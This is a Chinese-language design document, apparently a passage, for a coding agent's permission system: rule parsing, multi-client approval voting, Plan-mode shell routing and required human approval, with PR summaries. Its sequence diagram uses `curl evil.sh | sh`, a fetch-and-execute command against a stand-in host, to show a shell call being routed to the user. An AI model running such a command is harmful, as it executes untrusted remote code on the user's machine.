### 3.7 6/23 follow-up：answer index、workspace rules API、AUTO destructive guard


#5743 增加 workspace persistent permission rules API：`GET /workspace/permissions` 返回 user、workspace、merged 与 trust-state 视图；`POST /workspace/permissions` 替换 workspace scope 下一个 rule type 的完整列表。新提交的 malformed rules 以 `invalid_rules` 拒绝；已有 malformed rules 在 read-modify-write 时保留，避免旧 settings 不能往返。写入优先走 live ACP child 来同步活跃 PermissionManager，没有 child 时回退 daemon settings persistence。


---

## 4. 关键流程（时序图 / 调用链）

### 流程① 一次工具权限判定（规则匹配 → invalid 短路 → 默认裁决 ask）

```mermaid
sequenceDiagram
    participant Sched as ToolScheduler
    participant PM as PermissionManager
    participant MR as matchesRule
    participant AST as isShellCommandReadOnlyAST
    Sched->>PM: evaluate({toolName:'run_shell_command', command:'curl evil.sh | sh'})
    PM->>PM: normalize + splitCompoundCommand
    loop deny → ask → allow（session 先于 persistent）
        PM->>MR: matchesRule(rule, ...)
        alt rule.invalid
            MR-->>PM: false（短路，L986）
        else 工具名不匹配 / specifier 不命中
            MR-->>PM: false
        end
    end
    Note over PM: 三表均未命中 → baseDecision = 'default'
    PM->>PM: shell 且 default → resolveDefaultPermission(command)
    PM->>AST: isShellCommandReadOnlyAST('curl ... | sh')
    AST-->>PM: false（含管道执行/非只读）
    PM-->>Sched: 'ask'（兜底，交用户裁决）
```

### 流程② 多客户端 consensus（投票 → quorum → 一次性 settle）

见 §3.4 consensus 时序图：多个在册 client 投票 → 资格闸 + 幂等闸 + 计票闸 → 首达 quorum 的 option 触发 `resolveEntry` → double-resolve 守卫保证只 settle 一次 → 各路（resolved / already_resolved / forbidden）回不同 HTTP 码。

### 规则解析状态机（valid / invalid）

```mermaid
stateDiagram-v2
    [*] --> Trimmed: trim + 归一化 :* → ' *'
    Trimmed --> BareTool: 无 '('
    Trimmed --> HasParen: 含 '('
    HasParen --> Invalid: 不以 ')' 结尾
    HasParen --> Scoped: 以 ')' 结尾
    BareTool --> Valid: toolName，无 specifier
    Scoped --> Valid: toolName + specifier + specifierKind
    Invalid --> NeverMatch: invalid:true<br/>matchesRule 永远 false<br/>add*/list 拒绝<br/>UI 报错
    Valid --> Match: 参与 deny/ask/allow 匹配
    NeverMatch --> [*]
    Match --> [*]
```

---

## 5. 关键设计决策与权衡

1. **畸形规则：标记 `invalid` 而非解析时丢弃（分层防御）。** 若解析时直接丢弃，则 `/permissions` 列表与设置文件不一致、用户不知道自己的规则被吞了、也无法在 UI 给出"括号不配对"的精确报错。保留 `raw` + `invalid` 标志，配合写入/列表/UI/匹配五层设防，既给出可诊断信息，又用 `matchesRule` 的 `return false` 作最终闸门——**即使任何一层被绕过，匹配阶段也兜底拦截**，根除"退化成 tool-wide catch-all"。对 allow 表而言这直接消除了"手误漏括号 → 静默放行一切"的安全事故。

2. **命名空间非对称覆盖的安全考量。** `Bash(...)` 覆盖 monitor，`Monitor(...)` 不覆盖 shell。方向永远朝"更受限"收敛：宽工具授权惠及窄工具（防"换工具绕过既有授信"），窄工具授权不外溢到宽工具（防"monitor 授权意外扩权到一次性 shell 执行"，即 #3726 原 bug 的反面）。

3. **consensus quorum 默认 `floor(M/2)+1` 且封顶到 M。** 默认多数票；override 时 `min(override, max(M,1))` 封顶，避免运维误配 N>M 导致永不达标的死锁。M=2 退化为全票一致，用一次性 stderr breadcrumb 显式提醒，而非静默改变语义。`votersAtIssue` 用发起时刻快照，从根上杜绝"事后拉人头"灌票。

4. **cancel-sentinel 碰撞拒绝。** 用魔法串 `__cancelled__` 复用 optionId 通道表达"取消"，代价是与 agent 合法 option 标签可能碰撞。选择在**请求发起时同步抛 `CancelSentinelCollisionError`(500)**（fail-loud，contract violation），并在 wire 侧拒绝伪造的 `selected/__cancelled__`(400)。理由：一个永不 settle 的 Promise 比一个干净的快速失败更糟；把它定性为 agent↔daemon 的契约违反而非客户端错误（故 500 而非 4xx）。

5. **loopback 只读 `remoteAddress`，忽略 XFF（fail-closed）。** `local-only` 的安全性完全建立在"判定不可伪造"上，因此只信内核盖戳的 `req.socket.remoteAddress`，绝不解析 `X-Forwarded-For` 等 header；`remoteAddress` 异常时返回 `false`（宁可错杀不可放行）。配合 `clientId` 由 daemon 盖戳，构成 daemon 权限面的信任根。

6. **best-effort 可观测性绝不阻塞 settle（N2）。** 审计/SSE/stderr 全部 try/catch 兜底，连 EPIPE 都吞。宁丢面包屑，不留一个吊死的权限 Promise——后者会让 agent 卡在 `requestPermission` 直到超时。

7. **Plan-mode unknown shell 使用一次性审批而非规则写入。** #7172 把 unknown shell 看成“这次命令无法静态证明安全”，而不是“用户要长期信任这类命令”。审批只绑定当前 Plan revision、cwd、policy、tool 和 raw invocation；任何漂移都取消执行。这样 read-only 调查不会被阻塞，write 不会穿过 Plan mode，unknown 也不会因为一次确认变成持久授权。

---

## 6. 涉及 PR

| PR | 子主题 | 作用 |
|---|---|---|
| **#3467** | 畸形规则守卫 | `PermissionRule` 新增 `invalid?` 标志；`parseRule` 标记括号不配对的规则；`matchesRule` 短路；`add*Rule`/`addPersistentRule` 拒绝入表、`listRules` 过滤、`PermissionsDialog` UI 报错——五层防御，杜绝畸形规则退化成 tool-wide catch-all（尤其消除 allow 表的静默放行安全风险）。Closes #3459。 |
| **#3726** | `Monitor(...)` 命名空间 | 新增 `Monitor` 别名、把 `monitor` 纳入 `SHELL_TOOL_NAMES`/`CANONICAL_TO_RULE_DISPLAY`/`DISPLAY_NAME_TO_VERB`；`toolMatchesRuleToolName` 实现 Bash→monitor 单向覆盖。让 monitor 与 shell 拥有独立权限边界，修复 "Always Allow 对 monitor 失效 + 意外授予 shell 权限"。 |
| **#4335** | 多客户端权限协调（F3） | 实现 `MultiClientPermissionMediator`（早期落 `daemon_mode_b_main`，后随 #4490 进 main）：four-strategy（first-responder/designated/consensus/local-only）、N1 同步注册、`resolveEntry` double-resolve 守卫与 N2 结算顺序、consensus 防灌票与 quorum、cancel-sentinel 跨策略取消 + 碰撞防御、`detectFromLoopback` fail-closed、审计环（FIFO 512）、4 个 typed error（400/403/500/501）。实现 #4175 F3。 |
| **#5085** | Agent kind no-regression | 内部保留 `Kind.Agent`，但 ACP wire 继续映射到协议合法的 `other`，避免不存在的 `agent` wire kind 触发 daemon 校验丢帧。 |
| **#5105** | Agent 权限弹窗 | 在 `session/request_permission` 的 `toolCall._meta.toolName` 镜像规范工具名，权限 UI 用 `_meta.toolName === 'agent'` 恢复 Agent 专属确认文案。 |
| **#5218** | `ask_user_question` 取消即停止 | cancelled `ask_user_question` 不再作为普通工具错误继续喂给模型，而是结束当前 ACP turn、记录 skipped follow-up tool responses，并把嵌套取消传播到当前 Agent 与 sibling Agent。 |
| **#5258** | 普通权限取消即停止 | 将 #5218 的 stop-after-cancel 语义推广到所有工具权限：vote cancelled、reject option→Cancel、权限请求通道失败都会跳过同一 assistant step 的后续工具。 |
| **#5260** | 权限响应超时可配置 | `qwen serve --permission-response-timeout-ms` 暴露 ACP 权限/`ask_user_question` 单次响应超时；`0` 无限等待，非法值启动失败，超大值 clamp 到 Node timer 上限。 |
| **#5743** | workspace permissions API | `GET/POST /workspace/permissions` 管理 persistent allow/ask/deny rules；REST/ACP/SDK 共享校验和 schema，新增规则拒绝 malformed，存量 malformed 保留往返。 |
| **#6026** | subagent approval-mode override | subagent approval-mode override 从静态初值改成可变状态，`exit_plan_mode` 成功后后续权限判断读取新 mode。 |
| **#6087** | subagent plan lifecycle tool 阻断 | 从 subagent/team agent 的工具发现和 execute 层移除/拒绝 `enter_plan_mode` 与 `exit_plan_mode`，防止子 agent 控制主会话计划生命周期。 |
| **#6138** | teammate leader approval | `plan_mode_required` teammate 只能把计划交给 leader 审批，leader-only tool 批准后才恢复执行态，AUTO/YOLO 不可直接继承。 |
| **#6967** | main-session Plan exit explicit approval | `exit_plan_mode` 要求 host/user 显式批准；自动模式、allow rule、permission hook 和 LLM Plan Approval Gate 不能替代人工决策；execute 时用 revision guard 确认仍处于同一计划。 |
| **#7053** | shell safety tri-state facts | shell safety 从 boolean 拆成 read-only/write/unknown；default permission 仍输出 allow/ask，但 write/unknown 都不会被默认放行。 |
| **#7172** | Plan-mode shell routing | Plan mode 中模型发起的 shell/monitor 按 read-only/write/unknown 分流；read-only 走既有权限，write 直接拒绝，unknown 走一次性精确审批并在执行前校验 Plan revision/cwd/policy/raw invocation。 |
| **#7248** | Plan mode entry boundary | `enter_plan_mode` 成为同批 executable tool 的执行边界；第一个 entry tool 执行，其它 executable sibling fail-closed，并返回完整 Plan mode reminder 作为 lifecycle policy。 |
| **#7295** | permission prompt cancellation preservation | 权限等待、Plan unknown shell approval、Stop hook permission 与 background notification 在 parent abort 后报告 `cancelled`，并保留 recovered mid-turn message。 |

---

## 7. 已知限制 / 后续

1. **跨策略 cancel 逃生口（已文档化，仅 abort 方向）。** cancel-sentinel 的识别发生在策略分派**之前**（`vote()` L597），因此：`local-only` 下的非 loopback 投票者、`consensus` 下不在 `votersAtIssue` 的客户端，**虽不能 RESOLVE（批准/拒绝）权限，却仍能用 `{outcome:'cancelled'}` 中止它**。这是**刻意保留**的逃生口——voter-cancel 是 agent 侧的统一中止路径（注意只能朝"取消/abort"方向，不能朝"批准"方向）。已在 `CANCEL_VOTE_SENTINEL` JSDoc（L50-57）与 `voteLocalOnly` JSDoc（L940-953）显式标注，提醒未来维护者勿"修复"此 bypass。若威胁模型要求 policy-gated cancel，需后续 PR 把 cancel 提升到 per-policy 闸门（或独立部署 loopback-bind daemon）。

2. **`rememberResolved` 实为 FIFO，而非 PR body 所称的 "LRU"。** `resolved` map + `resolvedOrder` 数组的淘汰用 `resolvedOrder.shift()`（丢最早**插入**的）（`rememberResolved` L1184-1193），是 **FIFO**，不是按访问热度的 LRU。这是 DeepSeek review #4335/3271627446 的更正（对齐 `PermissionAuditRing` 在 commit b0242ddec 的同类修正）；`MAX_RESOLVED_PERMISSION_RECORDS` 上方的注释已同步改写为 "Bounded FIFO"（明确标注 "not LRU"），残留的 "LRU" 字样只剩类头 docstring（L13 `resolvedPermissions: LRU`）、一处内联注释（L508 "after LRU eviction"）与 PR 正文。容量 512 条，仅存 requestId/sessionId/outcome（<100KB），在正常重连/竞态窗口内足够，但**热点 requestId 在高吞吐下可能比冷门 requestId 更早被淘汰**——对"late SSE 订阅者收到 `permission_already_resolved`"是可接受的弱化。

3. **consensus 的 late-joiner / 空 voter 窗口。** prompt 发出前已连入但尚未触达任何 session 路由（daemon 还不知其 `X-Qwen-Client-Id`）的 SSE 订阅者，不会进入 `votersAtIssue` 快照，其后续投票被静默 `forbidden`；极窄竞态下若快照为空集，则该 consensus 请求**只能靠超时**结算（已打 stderr breadcrumb）。`votersAtIssue` 当前不上 wire，未来若新增 `eligibleVoters[]` 字段，应复用同一快照以保持服务端/客户端成员判定一致（注释 L262-281）。

4. **`designated_mismatch` reason 码被重载。** 它同时表示 designated 策略的"非 originator"与 consensus 策略的"不在 voter set"，wire 上同一字符串、审计同一 reason（`voteConsensus` TODO L805-814）。待有 SDK 消费方需要区分时，再拆成 `not_originator` / `voter_not_eligible`，以避免过早的协议 churn。

5. **`PermissionPolicyNotImplementedError`(501) 当前不可达。** 四种策略均已实现，该类与 501 映射作为前向兼容基建保留：未来新增第 5 种 policy 且跨多 commit 落地时，中间构建可抛它返回干净的 501（"daemon 比 settings 旧，请升级"）而非泛化 500。

6. **#7172 的作用域刻意收窄。** 它不处理用户手动 `!command`，也不把 unknown approval 持久化成规则，speculative interactive approval 仍保持 fail-closed。

7. **#7248 只阻断同批 executable sibling，不替代 Plan shell routing。** 它处理“进入 Plan mode 的 batch 边界”；进入之后的 shell/monitor read-only/write/unknown 分流仍由 #7172 负责。

8. **#7295 修 stopReason 和 preservation，不放宽权限。** parent abort 优先只会把终态从 `end_turn` 改成 `cancelled` 并保留已恢复上下文，不会把被拒或取消的工具重新执行。


---

## 8. 各 PR 代码贡献

### #3467 — 畸形规则守卫

- `types.ts:PermissionRule`：新增 `invalid?: boolean` 字段（L63），标记括号不配对的畸形规则，保留 `raw` 供诊断。
- `rule-parser.ts:parseRule`：检测 `normalized.endsWith(')')` 失败时返回 `{ raw, toolName, invalid: true }`（L270-273）；`parseRules` 批量解析对 invalid 项 `debugLogger.warn`。
- `rule-parser.ts:matchesRule`：函数体第一行 `if (rule.invalid) return false;`（L986），兜底保证畸形规则永不命中。
- `permission-manager.ts:addSessionAllowRule` / `addSessionDenyRule` / `addSessionAskRule` / `addPersistentRule`：入表前 `if (rule.invalid) { warn; return; }` 拒绝畸形规则进内存规则集；`listRules` 内部 `!rule.invalid` 过滤。
- `PermissionsDialog.tsx:handleAddRuleSubmit`：`parseRule` 后若 `rule.invalid` 立即 `setRuleInputError("Malformed rule: unbalanced parentheses...")` 并 return，从源头拦截手输畸形规则（L477-484）。

### #3726 — Monitor 命名空间

- `rule-parser.ts:TOOL_NAME_ALIASES`：新增 `Monitor`/`monitor`/`MonitorTool` → `'monitor'` 别名（L126-129）。
- `rule-parser.ts:SHELL_TOOL_NAMES`：从 `{'run_shell_command'}` 扩展为 `{'run_shell_command', 'monitor'}`（L138），使 monitor specifier 走 shell glob 匹配。
- `rule-parser.ts:CANONICAL_TO_RULE_DISPLAY` / `DISPLAY_NAME_TO_VERB`：新增 `monitor→'Monitor'`（L329-331）和 `Monitor→'monitor commands'`（L447）；`buildPermissionRules` 对 monitor 调用生成 `Monitor(...)` 而非 `Bash(...)`。
- `permission-manager.ts:SHELL_LIKE_TOOLS`（原 `SHELL_TOOL_NAMES` 引用）：`evaluate`/`evaluateShellVirtualOps`/`hasRelevantRules`/`hasMatchingAskRule` 等处的 `toolName === 'run_shell_command'` 全部替换为 `SHELL_LIKE_TOOLS.has(toolName)`。
- `monitor.ts:MonitorToolInvocation.getConfirmationDetails`：`permissionRules` 从 `` `Bash(${rule})` `` 改为 `` `Monitor(${rule})` ``，使 "Always Allow" 对 monitor 自洽生效。

### #4335 — 多客户端权限协调

- `permissionMediator.ts:MultiClientPermissionMediator`（L347）：实现 `PermissionMediator` 契约，`request()` N1 同步注册（Promise executor 内无 `await`）、`vote()` 按 `pending.policy` 分派到 `voteFirstResponder`/`voteDesignated`/`voteConsensus`/`voteLocalOnly` 四策略。
- `permissionMediator.ts:resolveEntry`（L1116）：唯一结算入口，对象身份比较幂等守卫（`pending.get(requestId) !== pending`）；N2 顺序：clearTimeout → 删 pending → emit → 写 resolved → audit → resolve Promise。
- `permissionMediator.ts:voteConsensus`（L797）+ `consensusQuorumFor`（L1027）：资格闸（`votersAtIssue` 发起时刻快照）、幂等重投（保留原始投票）、quorum 计票 `floor(M/2)+1`；`CANCEL_VOTE_SENTINEL = '__cancelled__'`（L64）跨策略取消 + `CancelSentinelCollisionError` 碰撞防御。
- `server.ts:detectFromLoopback`（L3381）：只读内核 `req.socket.remoteAddress` 判定 `127.*` / `::1` / `::ffff:127.*`，不解析 XFF header，fail-closed 返回 `false`。
- `bridgeErrors.ts`：4 个 typed error —— `InvalidPermissionOptionError`(400) / `PermissionForbiddenError`(403) / `CancelSentinelCollisionError`(500) / `PermissionPolicyNotImplementedError`(501)；`server.ts:sendPermissionVoteErrorImpl` 做 HTTP 状态码映射。

### #5085 — internal Agent kind, ACP wire stays other

- Agent 工具内部返回 `Kind.Agent`，保留 UI/权限侧的语义分流能力。
- `ToolCallEmitter.mapToolKind` 对 ACP wire 输出仍映射为 `other`，避免发送协议未声明的 `agent` kind。
- 回退依赖 `agent` wire kind 的 WebUI/web-shell/Java SDK 消费侧改动，并用 no-regression tests 锁定 ACP 线协议兼容。

### #5105 — Agent permission dialog via `_meta.toolName`

- `Session.ts` 在 `session/request_permission` 的 `toolCall._meta.toolName` 镜像规范工具名。
- VS Code `PermissionDrawer` 与 daemon web-shell `ToolApproval` 读取 `_meta.toolName === 'agent'` 后展示 Agent 专属标题和描述。
- 不改 ACP `kind` 枚举，避免 UI 需求反向污染线协议。

### #5218 — stop after cancelled `ask_user_question`

- `Session.ts`：cancelled `ask_user_question` 结束当前 turn，并为同批未执行工具写 skipped response，保留 replay 需要的 pending tool-response history。
- `SubAgentTracker.ts`：嵌套 Agent 取消使用 active abort signal 传播到当前 Agent 与 sibling Agent，避免 sibling success hook 在取消后继续触发。
- tests：`Session.test.ts` / `SubAgentTracker.test.ts` 覆盖普通和嵌套 Agent 的 cancelled question stop 语义。

### #5258 — stop after cancelled permissions

- `Session.ts`：普通工具权限 vote cancelled、reject option 映射到 `Cancel`、权限请求通道失败时，记录 declined tool 并跳过同一模型响应里的后续工具调用。
- `SubAgentTracker.ts`：subagent 内部权限取消 fail-closed，父 Agent turn 中止而不是继续执行 sibling 或后续工具。
- tests / E2E：focused ACP session tests 覆盖取消、reject、请求失败和嵌套 subagent；daemon/WebShell HTTP/SSE 验证两个 shell sentinel 均不落盘。

### #5260 — configurable ACP permission timeout

- `serve.ts` / `types.ts`：新增 `--permission-response-timeout-ms` 与 `ServeOptions.permissionResponseTimeoutMs`。
- `runQwenServe.ts`：启动期拒绝非有限、负数、非整数，避免非法配置被 bridge 当成 "关闭超时"。
- `bridge.ts`：权限响应超时默认仍为 5 分钟；`0` 关闭 deadline；超大值 clamp 到 `2^31-1`，避免 Node timer overflow 变成 1ms。
- tests：覆盖 CLI flag wiring、runQwenServe 校验、server 透传和 acp-bridge clamp。

### #5743 — workspace permissions rules API

- `workspace-permissions.ts`：新增 `GET /workspace/permissions` 与 `POST /workspace/permissions` route，返回 user/workspace/merged/trust-state 并替换 workspace scope 单个 rule type。
- `permission-settings.ts`：抽出权限 settings response shaping 与 invalid rule validation，REST route 与 ACP ext methods 复用。
- `acpAgent.ts`：写入优先同步 live PermissionManager；无 live child 时 daemon 侧持久化 settings。
- `DaemonClient.ts` / SDK types：新增 get/set/add/remove helpers；add/remove 是 read-modify-write 便利封装，无并发版本控制。

### #6026 — subagent approval-mode override 可变状态

- `tools/agent/agent.ts:createApprovalModeOverride`：override config 持有可变 approval mode 与 plan gate state，`getApprovalMode` 不再固定返回创建时的初始 mode。
- `exit_plan_mode` 成功后，subagent 后续权限判断读取更新后的 mode，能真正从 plan mode 进入执行态。
- AUTO dangerous-rule denial tracking 在 child config 内隔离，并按实际进入/退出 AUTO 的生命周期恢复共享 PermissionManager，而不是只看初始 approval mode。
- `agent-override.test.ts` 覆盖 subagent exit plan mode、AUTO cleanup、共享 permission manager 规则恢复和子 config 状态隔离。

### #6087 — subagent plan lifecycle tool 阻断

- `agents/runtime/subagent-plan-tool-policy.ts`：集中定义 `SUBAGENT_PLAN_LIFECYCLE_TOOLS`、`isSubagentLikeExecutionContext`、统一 blocker message 和 ToolResult builder。
- `agents/runtime/agent-core.ts` / `workflow-orchestrator.ts`：从 wildcard/default/显式工具名中移除 `enter_plan_mode` 与 `exit_plan_mode`，并通过 AsyncLocalStorage 保持 workflow-dispatched agent 的 subagent context。
- `tools/tool-search.ts`：subagent context 下拒绝 select/load plan lifecycle deferred tools，防止工具过滤后被二次发现。
- `tools/enterPlanMode.ts` / `tools/exitPlanMode.ts`：runtime guard 返回错误 ToolResult，不修改 approval mode 或 plan gate state。
- `core/coreToolScheduler.ts`：plan-mode 阻断非只读工具时，对 subagent/SDK 使用“直接把计划交回 caller”的 reminder，而不是引导进入交互式 approval flow。

### #6138 — plan-required teammate leader approval

- `tools/agent/agent.ts`：新增 `plan_mode_required` 参数，仅对 named teammate 生效；teammate 启动时进入 `ApprovalMode.PLAN`，并把 identity 标记为 plan-required。
- `agents/team/TeamManager.ts`：维护 pending approval map，`requestPlanApproval()` 生成 opaque request id，把 teammate-authored plan 包在 `<team_plan_approval_request>` envelope 中发送给 leader，并把 payload 标为不可信数据。
- `tools/team-plan-approval.ts`：新增 leader-only approve/reject tool；teammate/subagent runtime 下 fail-closed，避免子 agent 自批。
- `core/coreToolScheduler.ts` / `agents/runtime/subagent-plan-tool-policy.ts`：等待 leader 批准期间只允许 `exit_plan_mode` 与 claim-only `task_update(status:"in_progress")`，其他工具返回 pre-approval blocked message。
- 批准后根据 leader 当前 approval mode 恢复 teammate 执行态；`AUTO` 或 untrusted `AUTO_EDIT`/`YOLO` 降级到 `DEFAULT`，leader 仍在 `PLAN` 时拒绝批准并保留 pending。

### #6967 — explicit user approval to exit Plan mode

- `tools/tool.ts` / scheduler permission plumbing：新增工具级 `requiresUserInteraction()` 维度，让 `exit_plan_mode` 的确认请求不能被 YOLO/AUTO、allow rule 或 permission hook 自动满足。
- `tools/exitPlanMode.ts`：confirmation callback 只记录用户决策与当前 plan revision，不再在 confirmation 阶段直接切换 approval mode；`execute()` 在确认仍允许、仍处 Plan mode、revision 未变化时才执行退出。
- Plan Approval Gate：移除 LLM 自批路径，避免模型生成的 plan approval 被当作用户批准；teammate leader approval 路径仍保留独立的 leader-only flow。
- tests：覆盖自动 approval mode 不能批准 `exit_plan_mode`、hook allow 不能替代用户、revision 变化后拒绝执行、subagent/team guard 不回归。

### #7053 — shell safety read-only/write/unknown facts

- `utils/shellAstParser.ts`：新增 `classifyShellCommandSafety()`，统一返回 `read-only` / `write` / `unknown`，并用 `write > unknown > read-only` 合并 AST 分支、substitution、control flow 与 compound command。
- `utils/shell-safety-rules.ts`：抽出 bounded sed/awk scanner、Git/find/sed/awk/sort/tree/uniq/tee/dd option 规则和 shell pattern helper，避免 regex fallback 把 message/file name 误判成写操作。
- `utils/shellAstParser.ts:isShellCommandReadOnlyAST()`：保持 boolean 兼容；只有三态为 `read-only` 时 true，parser 无法加载或抛错时才使用历史 regex fallback，语法错误 AST 归 unknown/false。
- `core/coreToolScheduler.ts`：同步只读判断检查原始 shell command，不再先 unwrap `bash -c`/wrapper，避免 wrapper 命令被误并发执行。
- `permissions/permission-manager.ts`：default shell permission 仍消费 boolean API；#7053 本身不改变默认非 Plan allow/ask routing，unknown 和 write 都不会被默认静默允许。

### #7172 — Plan-mode shell safety routing

- `core/plan-mode-shell-policy.ts`：新增 Plan-mode shell routing，把 `run_shell_command` / `monitor` 按 `classifyShellCommandSafety()` 结果分成 read-only/write/unknown，并生成 read-only pass-through、write blocked、unknown approval-required 三类结果。
- `core/coreToolScheduler.ts`：在 Plan mode 中对模型发起的 shell/monitor 调用应用 routing；write 直接返回 blocked tool result，unknown 生成一次性 approval request，read-only 继续进入既有权限路径。
- `acp-integration/session/permissionUtils.ts` / `Session.ts` / `SubAgentTracker.ts`：把 unknown shell approval 的 raw invocation、Plan revision、cwd、permission policy 等上下文绑定到审批并在执行前重新校验；subagent/team/background/speculation 路径复用同一 guard。
- `nonInteractiveCli.ts`、`StreamJsonOutputAdapter`、`DualOutputBridge` 与 TUI `ToolConfirmationMessage`：让 stream-json、dual-output 和交互确认框一致展示 Plan-mode unknown shell 的一次性批准/拒绝语义。
- tests：`plan-mode-shell-policy.test.ts`、`coreToolScheduler.test.ts`、`Session.test.ts`、`permissionUtils.test.ts`、`SubAgentTracker.test.ts`、`nonInteractiveCli.test.ts` 和 dual-output/TUI tests 覆盖三态分流、审批 fencing、漂移取消和多运行形态一致性。

### #7248 — Plan mode entry boundary

- `core/plan-mode-entry-policy.ts`：新增同批工具调用策略，识别第一个 `enter_plan_mode`，并把其它 executable sibling 标为 denied/skipped，要求下一轮在 Plan mode 下重新发起。
- `core/coreToolScheduler.ts`、ACP session 与 headless/non-interactive 路径：在最终工具调度前复用同一 boundary policy，避免不同 runtime 对同批 entry+sibling 的处理不一致。
- `tools/enterPlanMode.ts`：成功或幂等返回完整 `getPlanModeSystemReminder()`，并作为 lifecycle policy 绕过普通 tool output budget/offload。
- tests：覆盖 Core scheduler、ACP、headless、dedupe、只读 sibling 与 reminder 完整性。

### #7295 — preserve cancellation during permission prompts

- `acp-integration/session/permissionUtils.ts` / `Session.ts`：新增 abort-aware stop reason helper，权限等待与 Plan unknown shell approval 在 parent abort 后报告 `cancelled`，而不是自然 `end_turn`。
- Stop hook / background notification 终态路径：返回前统一检查 parent abort，保证取消语义在 nested waiting point 中不会被覆盖。
- `#preserveStoppedToolRun()`：新增 `preserveFallbackOnAbort`，abort 场景仍保留 recovered mid-turn message，避免取消响应丢上下文。
- tests：覆盖 Plan shell approval、Stop hook permission、Stop-hook iteration 间 abort、background notification permission wait 和 recovered message preservation。
